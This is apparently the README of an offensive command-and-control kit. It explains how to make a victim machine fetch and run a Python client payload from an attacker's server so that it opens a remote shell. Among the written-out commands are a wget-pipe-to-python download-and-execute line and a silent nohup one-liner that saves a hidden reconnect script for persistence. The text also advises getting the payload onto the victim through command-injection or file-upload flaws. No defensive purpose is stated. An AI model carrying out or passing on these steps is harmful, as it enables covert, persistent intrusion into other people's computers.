# Usage

Note: With all methods - there needs to be a way to run a command on the client machine to kick-off the connection to the CNC server (hacker's machine).
There is more than one way to do this - but would be good to find a straight-forward vulnerability such a a command line injection if possible.

## Method 1: Startup Script [PREFERRED]

### On Hacking machine (CNC Server)
Run startup script
`bash startup.sh`

Then follow on screen instructions.



## Method 2: Manual
(works with cmd line injection)

- [SERVER] Host client_payload.py somehere
- - One option is to start a python web server on the cnc_server
- - `python3 -m http.server 8080`   
- [CLIENT] Download + Execute from client machine
- - `wget -O - <cnc_server_ip>:8080/client_payload.py | python3`
- [OPTIONAL] Once you have a connection to client from cnc server...
- - Download + Execute the client_connect.sh script (keeps reconnects the client if it disconnects)
- - CNC server could host the client_connect.sh script.
- - - This file must first be edited to match the host/port details you already have in use.
- - - `wget -q <cnc_server_ip>:8080/client_connect.sh &> /dev/null ; 
- - - `bash client_connect.sh &> /dev/null & `
- - One-Liner
- - - `{ wget -q -O .i.sh <cnc_server_ip>:8080/client_connect.sh ; } && { nohup bash .i.sh &> /dev/null & }`
- - Make sure you exit from CNC server with 'exit' to disconnect properly.



## Method 3: Direct Client Access

- [SERVER] `python3 server_shell.py` <- edit the file to use the port you want or pass it in as an argument (default 8000). 
- [CLIENT] `python3 client_payload.py`<- edit the file to use the CNC server IP and port you want. 
- - Or pass them in as an argumenta (default port 8000)
- - `python3 client_payload.py <cnc_server_ip> <cnc_server_port>`


# Other ways to get client_payload.py on victim machine
You could also exploit a file upload vulnerability of aa web application and upload the client_payload file onto the victim's machine.
Just make sure you listen on sever and manage a way to run the client_payload.py script on the client machine.


### Port as an optional argument
Both client_payload and server_shell scripts communicate on port 8000 by default.
This can be changed to another port - but you would need to make sure both scripts have the same port..

